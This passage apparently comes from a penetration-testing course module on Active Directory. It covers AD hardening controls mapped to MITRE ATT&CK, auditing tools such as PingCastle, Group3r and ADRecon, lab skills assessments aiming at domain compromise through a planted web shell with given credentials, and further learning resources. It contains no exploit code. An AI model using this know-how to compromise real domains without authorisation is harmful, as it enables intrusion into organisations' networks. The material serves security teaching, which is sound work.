- Use Extended Protection for Authentication along with enabling Require SSL only to allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services
- Enable SMB signing and LDAP signing
- Take steps to prevent enumeration with tools like BloodHound
- Ideally, perform quarterly penetration tests/AD security assessments, but if budget constraints exist, these should be performed annually at the very least.
- Test backups for validity and review/practice disaster recovery plans.
- Enable the restriction of anonymous access and prevent null session enumeration by setting the `RestrictNullSessAccess` registry key to `1` to restrict null session access to unauthenticated users.

## Protections By Section

As a different look at this, we have broken out the significant actions by section and correlated controls based on the TTP and a MITRE tag. Each tag corresponds with a section of the [Enterprise ATT&CK Matrix](https://attack.mitre.org/tactics/enterprise/) found here. Any tag marked as `TA` corresponds to an overarching tactic, while a tag marked as `T###` is a technique found in the matrix under tactics.

| **TTP** | **MITRE Tag** | **Description** |
| --- | --- | --- |
| `External Reconnaissance` | `T1589` | This portion of an attack is extremely hard to detect and defend against. An attacker does not have to interact with your enterprise environment directly, so it's impossible to tell when it is happening. What can be done is to monitor and control the data you release publically to the world. Job postings, documents (and the metadata left attached), and other open information sources like BGP and DNS records all reveal something about your enterprise. Taking care to `scrub` documents before release can ensure an attacker cannot glean user naming context from them as an example. The same can be said for not providing detailed information about tools and equipment utilized in your networks via job postings. |
| `Internal Reconnaissance` | `T1595` | For reconnaissance of our internal networks, we have more options. This is often considered an active phase and, as such, will generate network traffic which we can monitor and place defenses based on what we see. `Monitoring network traffic` for any suspicious bursts of packets of a large volume from any one source or several sources can be indicative of scanning. A properly configured `Firewall` or `Network Intrusion Detection System` ( `NIDS`) will spot these trends quickly and alert on the traffic. Depending on the tool or appliance, it may even be able to add a rule blocking traffic from said hosts proactively. The utilization of network monitoring coupled with a SIEM can be crucial to spotting reconnaissance. Properly tuning the Windows Firewall settings or your EDR of choice to not respond to ICMP traffic, among other types of traffic, can help deny an attacker any information they may glean from the results. |
| `Poisoning` | `T1557` | Utilizing security options like `SMB message signing` and `encrypting traffic` with a strong encryption mechanism will go a long way to stopping poisoning & man-in-the-middle attacks. SMB signing utilizes hashed authentication codes and verifies the identity of the sender and recipient of the packet. These actions will break relay attacks since the attacker is just spoofing traffic. |
| `Password Spraying` | `T1110/003` | This action is perhaps the easiest to defend against and detect. Simple logging and monitoring can tip you off to password spraying attacks in your network. Watching your logs for multiple attempts to login by watching `Event IDs 4624` and `4648` for strings of invalid attempts can tip you off to password spraying or brute force attempts to access the host. Having strong password policies, an account lockout policy set, and utilizing two-factor or multi-factor authentication can all help prevent the success of a password spray attack. For a deeper look at the recommended policy settings, check out this [article](https://www.netsec.news/summary-of-the-nist-password-recommendations-for-2021/) and the [NIST](https://pages.nist.gov/800-63-3/sp800-63b.html) documentation. |
| `Credentialed Enumeration` | `TA0006` | There is no real defense you can put in place to stop this method of attack. Once an attacker has valid credentials, they effectively can perform any action that the user is allowed to do. A vigilant defender can detect and put a stop to this, however. Monitoring for unusual activity such as issuing commands from the CLI when a user should not have a need to utilize it. Multiple RDP requests sent from host to host within the network or movement of files from various hosts can all help tip a defender off. If an attacker manages to acquire administrative privileges, this can become much more difficult, but there are network heuristics tools that can be put in place to analyze the network constantly for anomalous activity. Network segmentation can help a lot here. |
| `LOTL` | N/A | It can be hard to spot an attacker while they are utilizing the resources built-in to host operating systems. This is where having a `baseline of network traffic` and `user behavior` comes in handy. If your defenders understand what the day-to-day regular network activity looks like, you have a chance to spot the abnormal. Watching for command shells and utilizing a properly configured `Applocker policy` can help prevent the use of applications and tools users should not have access to or need. |
| `Kerberoasting` | `T1558/003` | Kerberoasting as an attack technique is widely documented, and there are plenty of ways to spot it and defend against it. The number one way to protect against Kerberoasting is to `utilize a stronger encryption scheme than RC4` for Kerberos authentication mechanisms. Enforcing strong password policies can help prevent Kerberoasting attacks from being successful. `Utilizing Group Managed service accounts` is probably the best defense as this makes Kerberoasting no longer possible. Periodically `auditing` your users' account permissions for excessive group membership can be an effective way to spot issues. |

#### MITRE ATT&CK Breakdown

![text](https://academy.hackthebox.com/storage/modules/143/mitre.gif)

I wanted to take a second to show everyone how it appears when exploring the ATT&CK framework. We will use the example above of `Kerberoasting` to look at it through the lens of the framework. Kerberoasting is a part of the larger `Tactic tag TA0006 Credential Access` (Green square in the image above). Tactics encompass the overall goal of the actor and will contain various techniques which map to that goal. Within this scope, you will see all manner of credential-stealing techniques. We can scroll down and look for `Steal or Forge Kerberos Tickets`, which is `Technique Tag T1558` (blue square in the image above). This technique contains four sub-techniques (indicated by the `.00#` beside the technique name) Golden Ticket, Silver Ticket, Kerberoasting, and AS-REP Roasting. Since we care about Kerberoasting, we would select the sub-technique `T1558.003` (orange box in the image above), and it will take us to a new page. Here, we can see a general explanation of the technique, the information referencing the ATT&CK platform classification on the top right, examples of its use in the real world, ways to mitigate and detect the tactic, and finally, references for more information at the bottom of the page.

So our technique would be classified under `TA0006/T1558.003`. This is how the Tactic/Technique tree would be read. There are many different ways to navigate the framework. We just wanted to provide some clarification on what we were looking for and how we were defining tactics versus techniques when talking about MITRE ATT&CK in this module. This framework is great to explore if you are curious about a `Tactic` or `Technique` and want more information about it.

* * *

These are not an exhaustive list of defensive measures, but they are a strong start. As attackers, if we understand the potential defensive measures we can face during our assessments, we can plan for alternate means of exploitation and movement. We won't win every battle; some defenders may have their environments locked down tight and see every move you make, but others may have missed one of these recommendations. It is important to explore them all, and help provide the defensive team with the best results possible. Also, understanding how the attacks and defenses work will make us improve cybersecurity practitioners overall.


# Additional AD Auditing Techniques

* * *

Along with discussing the hardening of an AD domain, we wanted to discuss `AD auditing`. We want to provide our customers with as much information as possible to help solve the potential issues we find. Doing so will give them more data to prove they have a problem and help acquire backing and funding to tackle those fixes. The tools in this section can be utilized to provide different visualizations and data output for this purpose.

* * *

## Creating an AD Snapshot with Active Directory Explorer

[AD Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) is part of the Sysinternal Suite and is described as:

"An advanced Active Directory (AD) viewer and editor. You can use AD Explorer to navigate an AD database easily, define favorite locations, view object properties, and attributes without opening dialog boxes, edit permissions, view an object's schema, and execute sophisticated searches that you can save and re-execute."

AD Explorer can also be used to save snapshots of an AD database for offline viewing and comparison. We can take a snapshot of AD at a point in time and explore it later, during the reporting phase, as you would explore any other database. It can also be used to perform a before and after comparison of AD to uncover changes in objects, attributes, and security permissions.

When we first load the tool, we are prompted for login credentials or to load a previous snapshot. We can log in with any valid domain user.

#### Logging in with AD Explorer

![image](https://academy.hackthebox.com/storage/modules/47/AD_explorer1.png)

Once logged in, we can freely browse AD and view information about all objects.

#### Browsing AD with AD Explorer

![image](https://academy.hackthebox.com/storage/modules/47/AD_explorer_logged_in.png)

To take a snapshot of AD, go to File --> `Create Snapshot` and enter a name for the snapshot. Once it is complete, we can move it offline for further analysis.

## PingCastle

[PingCastle](https://www.pingcastle.com/documentation/) is a powerful tool that evaluates the security posture of an AD environment and provides us the results in several different maps and graphs. Thinking about security for a second, if you do not have an active inventory of the hosts in your enterprise, PingCastle can be a great resource to help you gather one in a nice user-readable map of the domain. PingCastle is different from tools such as PowerView and BloodHound because, aside from providing us with enumeration data that can inform our attacks, it also provides a detailed report of the target domain's security level using a methodology based on a risk assessment/maturity framework. The scoring shown in the report is based on the [Capability Maturity Model Integration](https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration) (CMMI). For a quick look at the help context provided, you can issue the `--help` switch in cmd-prompt.

Note: If you are having issues with starting the tool, please change the date of the system to a date before 31st of July 2023 using the Control Panel (Set the time and date).

#### Viewing the PingCastle Help Menu

```cmd-session
C:\htb> PingCastle.exe --help

switch:
  --help              : display this message
  --interactive       : force the interactive mode
  --log               : generate a log file
  --log-console       : add log to the console
  --log-samba <option>: enable samba login (example: 10)

Common options when connecting to the AD
  --server <server>   : use this server (default: current domain controller)
                        the special value * or *.forest do the healthcheck for all domains
  --port <port>       : the port to use for ADWS or LDAP (default: 9389 or 389)
  --user <user>       : use this user (default: integrated authentication)
  --password <pass>   : use this password (default: asked on a secure prompt)
  --protocol <proto>  : selection the protocol to use among LDAP or ADWS (fastest)
                      : ADWSThenLDAP (default), ADWSOnly, LDAPOnly, LDAPThenADWS

<SNIP>

```

#### Running PingCastle

To run PingCastle, we can call the executable by typing `PingCastle.exe` into our CMD or PowerShell window or by clicking on the executable, and it will drop us into interactive mode, presenting us with a menu of options inside the `Terminal User Interface` ( `TUI`).

#### PingCastle Interactive TUI

```cmd-session
|:.      PingCastle (Version 2.10.1.0     1/19/2022 8:12:02 AM)
|  #:.   Get Active Directory Security at 80% in 20% of the time

  .:       twitter: @mysmartlogon                    https://www.pingcastle.com
What do you want to do?
=======================
Using interactive mode.
Do not forget that there are other command line switches like --help that you can use
  1-healthcheck-Score the risk of a domain
  2-conso      -Aggregate multiple reports into a single one
  3-carto      -Build a map of all interconnected domains
  4-scanner    -Perform specific security checks on workstations
  5-export     -Export users or computers
  6-advanced   -Open the advanced menu
  0-Exit
==============================
This is the main functionnality of PingCastle. In a matter of minutes, it produces a report which will give you an overview of your Active Directory security. This report can be generated on other domains by using the existing trust links.

```

The default option is the `healthcheck` run, which will establish a baseline overview of the domain, and provide us with pertinent information dealing with misconfigurations and vulnerabilities. Even better, PingCastle can report recent vulnerability susceptibility, our shares, trusts, the delegation of permissions, and much more about our user and computer states. Under the Scanner option, we can find most of these checks.

#### Scanner Options

```cmd-session

```

Now that we understand how it works and how to start scans, let's view the report.

#### Viewing The Report

Throughout the report, there are sections such as domain, user, group, and trust information and a specific table calling out "anomalies" or issues that may require immediate attention. We will also be presented with the domain's overall risk score.

![text](https://academy.hackthebox.com/storage/modules/143/report-example.png)

Aside from being helpful in performing very thorough domain enumeration when combined with other tools, PingCastle can be helpful to give clients a quick analysis of their domain security posture, or can be used by internal teams to self-assess and find areas of concern or opportunities for further hardening. Take some time to explore the reports and maps PingCastle can generate on the Inlanefreight domain.

#### Group Policy

With group policy being a large portion of how AD user and computer management is done, it's only logical that we would want to audit their settings and highlight any potential holes. `Group3r` is an excellent tool for this.

* * *

## Group3r

[Group3r](https://github.com/Group3r/Group3r) is a tool purpose-built to find vulnerabilities in Active Directory associated Group Policy. Group3r must be run from a domain-joined host with a domain user (it does not need to be an administrator), or in the context of a domain user (i.e., using `runas /netonly`).

#### Group3r Basic Usage

```cmd-session
C:\htb> group3r.exe -f <filepath-name.log>

```

When running Group3r, we must specify the `-s` or the `-f` flag. These will specify whether to send results to stdout (-s), or to the file we want to send the results to (-f). For more options and usage information, utilize the `-h` flag, or check out the usage info at the link above.

Below is an example of starting Group3r.

#### Reading Output

![text](https://academy.hackthebox.com/storage/modules/143/grouper-output.png)

When reading the output from Group3r, each indentation is a different level, so no indent will be the GPO, one indent will be policy settings, and another will be findings in those settings. Below we will take a look at the output shown from a finding.

#### Group3r Finding

![text](https://academy.hackthebox.com/storage/modules/143/grouper-finding.png)

In the image above, you will see an example of a finding from Group3r. It will present it as a linked box to the policy setting, define the interesting portion and give us a reason for the finding. It is worth the effort to run Group3r if you have the opportunity. It will often find interesting paths or objects that other tools will overlook.

* * *

## ADRecon

Finally, there are several other tools out there that are useful for gathering a large amount of data from AD at once. In an assessment where stealth is not required, it is also worth running a tool like [ADRecon](https://github.com/adrecon/ADRecon) and analyzing the results, just in case all of our enumeration missed something minor that may be useful to us or worth pointing out to our client.

#### Running ADRecon

```powershell
PS C:\htb> .\ADRecon.ps1

[*] ADRecon v1.1 by Prashant Mahajan (@prashant3535)

```

Once done, ADRecon will drop a report for us in a new folder under the directory we executed from. We can see an example of the results in the terminal below. You will get a report in HTML format and a folder with CSV results. When generating the report, it should be noted that the program Excel needs to be installed, or the script will not automatically generate the report in that manner; it will just leave you with the .csv files. If you want output for Group Policy, you need to ensure the host you run from has the `GroupPolicy` PowerShell module installed. We can go back later and generate the Excel report from another host using the `-GenExcel` switch and feeding in the report folder.

#### Reporting

```powershell
PS C:\htb> ls

    Directory: C:\Tools\ADRecon-Report-20220328092458

```

* * *

We have covered so many tools and tactics within this module, but we felt it was prudent to show and explain a few other ways to audit a target domain. Keep in mind that your actions should serve a purpose, and our end goal is to make the customer's security posture better. So with that in mind, acquiring more evidence of issues will only serve to:

`Make our reporting more convincing and provide the customer with the tools they need to fix & actively secure their domain`.


# AD Enumeration & Attacks - Skills Assessment Part I

* * *

## Scenario

A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. Before switching projects, our teammate left a password-protected web shell (with the credentials: `admin:My_W3bsH3ll_P@ssw0rd!`) in place for us to start from in the `/uploads` directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.

Apply what you learned in this module to compromise the domain and answer the questions below to complete part I of the skills assessment.


# AD Enumeration & Attacks - Skills Assessment Part II

* * *

## Scenario

Our client Inlanefreight has contracted us again to perform a full-scope internal penetration test. The client is looking to find and remediate as many flaws as possible before going through a merger & acquisition process. The new CISO is particularly worried about more nuanced AD security flaws that may have gone unnoticed during previous penetration tests. The client is not concerned about stealth/evasive tactics and has also provided us with a Parrot Linux VM within the internal network to get the best possible coverage of all angles of the network and the Active Directory environment. Connect to the internal attack host via SSH (you can also connect to it using `xfreerdp` as shown in the beginning of this module) and begin looking for a foothold into the domain. Once you have a foothold, enumerate the domain and look for flaws that can be utilized to move laterally, escalate privileges, and achieve domain compromise.

Apply what you learned in this module to compromise the domain and answer the questions below to complete part II of the skills assessment.


# Beyond this Module

* * *

## Status Update

By the end of the skills assessments, we provided enough access and enumeration results to our senior pentesters to complete their follow-on actions and successfully meet all assessment objectives. Demonstrating our skills has shown the team lead that we are now capable of performing actions for more upcoming assessments dealing with Active Directory environments. He will be providing us with more tasks soon.

## Real World

As a Penetration Tester, one could expect the tasks provided in this module to a part of our day-to-day duties. Having a deep understanding of AD and what we can glean from it (access and enumeration-wise) is essential to fulfill the duties of the role. Our actions may often influence the actions of our teammates and senior testers if we are working on an assessment as a team. Those actions could include:

- Taking advantage of cross-domain trusts to infiltrate other domains
- Persistence methods
- Command and Control within the domain for assessments that have longer windows,

With the modern enterprise moving toward hybrid and cloud environments, understanding the foundations within AD and how to abuse them will be extremely helpful when attempting to pivot to these new types of networks. If any of the concepts, terminology, or actions discussed in this module were a bit challenging or confusing, consider going back and checking out the [Introduction To Active Directory](https://academy.hackthebox.com/course/preview/introduction-to-active-directory) module. It contains a deep dive into all things AD and helps lay a foundation of knowledge needed to understand Active Directory.

## What's Next?

Check out the [Active Directory BloodHound](https://academy.hackthebox.com/course/preview/active-directory-bloodhound) module to better understand how BloodHound works. Also, check out the [Active Directory LDAP](https://academy.hackthebox.com/course/preview/active-directory-ldap) and [Active Directory PowerView](https://academy.hackthebox.com/course/preview/active-directory-powerview) modules. The [Cracking Passwords with Hashcat](https://academy.hackthebox.com/course/preview/cracking-passwords-with-hashcat) module can also help improve our understanding of the actions we took in the Kerberoasting and Password Spraying sections.

## More AD Learning Opportunities

The Hack The Box main platform has many targets for learning and practicing AD enumeration and attacks. The [AD Track](https://www.hackthebox.com/home/tracks/4) on the main HTB platform is an excellent resource for practice. `Tracks` are curated lists of machines and challenges for users to work through and master a particular topic. The AD Track contains boxes of varying difficulties with various attack vectors. Even if you cannot solve these boxes on your own, it is still worth working with them with a walkthrough or video or just watching the video on the box by Ippsec. The more you expose yourself to these topics, the more comfortable and second nature enumeration and many attacks will become. The boxes below are great to practice the skills learned in this module.

#### Boxes To Pwn

Ippsec has recorded videos explaining the paths through many of these boxes and more. As a resource, [Ippsec's site](https://ippsec.rocks/?#) is a great resource to search for videos and write-ups pertaining to many different subjects. Check out his videos and write-ups if you get stuck or want a great primer dealing with Active Directory and wish to see how some of the tools work.

#### ProLabs

`Pro Labs` are large simulated corporate networks that teach skills applicable to real-life penetration testing engagements. The `Dante` Pro Lab is an excellent place to start with varying vectors and some AD exposure. The `Offshore` Pro Lab is an advanced-level lab that contains a wealth of opportunities for practicing AD enumeration and attacks.

#### Great Videos to Check Out

[Six Degrees of Domain Admin](https://youtu.be/wP8ZCczC1OU) from `DEFCON 24` is a great watch for an introduction to BloodHound.

[Designing AD DACL Backdoors](https://youtu.be/_nGpZ1ydzS8) by Will Schroeder and Andy Robbins is a gem if you haven't seen it. [Kicking The Guard Dog of Hades](https://www.youtube.com/watch?v=PUyhlN-E5MU) is one of the original releases for Kerberoasting and is a great watch. In [Kerberoasting 101](https://youtu.be/Jaa2LmZaNeU), Tim Medin does an excellent job dissecting the Kerberoasting attack and how to perform them.

There are so many more, but building a list here would take a whole other section. The videos above are a great start to advancing your AD knowledge.

#### Writers and Blogs To Follow

Between the HTB `Discord`, Forums, and `blogs`, there are plenty of outstanding write-ups to help advance your skills along the way. One to pay attention to would be [0xdf's walkthroughs](https://0xdf.gitlab.io/tags.html#active-directory). These are also a great resource to understand how an Active Directory `attack path` may look in the real world. `0xdf` writes about much more, and his blog is an excellent resource. The list below contains links to other authors and blogs we feel do a great job discussing AD security topics and much more.

[SpecterOps](https://posts.specterops.io/) has an interesting blog where they talk about AD, `BloodHound`, Command and Control, and so much more.

[Harmj0y](https://blog.harmj0y.net/category/activedirectory/) writes quite a bit about AD, among other things as well. He is someone you should be following if you are looking to work in this industry.

[AD Security Blog](https://adsecurity.org/?author=2) by Sean Metcalf is a treasure box full of awesome content, all AD and security related. It is a must-read if you are focused on Active Directory.

[Shenaniganslabs](https://shenaniganslabs.io/) is a great group of security researchers discussing many different topics in the security realm. These can include new vulnerabilities to Threat Actor TTPs.

[Dirk-jan Mollema](https://dirkjanm.io/) also has a great blog documenting his adventures with AD security, Azure, protocols, vulnerabilities, Python, etc.

[The DFIR Report](https://thedfirreport.com/) is maintained by a talented team of Blue Teamers/Infosec Content creators that share their findings from recent intrusion incidents in incredible detail. Many of their posts showcase AD attacks and the artifacts that attackers leave behind.

## Closing Thoughts

Absorbing everything we can about Active Directory security and becoming familiar with the TTPs utilized by different teams and threat actors will take us a long way. [MITRE's Enterprise Attack Matrix](https://attack.mitre.org/matrices/enterprise/windows/) is a great place to research attacks and their corresponding tools and defenses. AD is a vast topic and will take time to master. New vulnerability vectors and PoC attacks are being released frequently. This topic isn't going anywhere, so use the resources available to stay ahead of the curve and keep networks actively secure. A fundamental understanding of AD and the tools surrounding the field, both as a penetration tester or defender, will keep us up to date. The more we understand the bigger picture, the more powerful we will become as attackers and defenders, and the more value we can provide to our clients and the companies we work for. Improving security is our focus, but nothing says we can't have fun while doing so.

Thanks for following along on this adventure, and keep on learning!
